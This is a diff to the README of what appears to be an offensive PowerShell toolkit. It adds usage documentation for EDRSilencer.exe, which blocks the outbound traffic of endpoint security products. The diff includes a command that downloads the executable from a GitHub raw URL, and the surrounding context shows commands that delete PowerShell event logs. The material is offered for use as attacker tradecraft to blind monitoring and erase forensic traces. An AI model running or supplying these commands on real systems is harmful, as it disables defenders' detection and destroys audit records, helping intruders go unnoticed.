@@ -79,3 +79,38 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetLog
 #Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
 .\GetLogs.ps1 -GetLogs 'DeleteAll' -Verb "Microsoft-Windows-Powershell/Operational"
 ```
+
+<br />
+
+## EDRSilencer.exe
+
+|Cmdlet Name|Description|Privileges|Notes|
+|---|---|---|---|
+|[EDRSilencer](https://github.com/netero1010/EDRSilencer)|Search known running EDR processes and add WFP filter to block its outbound traffic|\*\*\*|
+
+<br />
+
+**Download cmdlet:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/ETWpatch/EDRSilencer.exe" -OutFile "EDRSilencer.exe"
+```
+
+<br />
+
+**Execute:**
+```powershell
+Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>
+
+- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:
+  .\EDRSilencer.exe blockedr
+
+- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):
+  .\EDRSilencer.exe block "C:\Windows\System32\curl.exe"
+
+- Remove all WFP filters applied by this tool:
+  .\EDRSilencer.exe unblockall
+
+- Remove a specific WFP filter based on filter id:
+  .\EDRSilencer.exe unblock <filter id>
+```
+
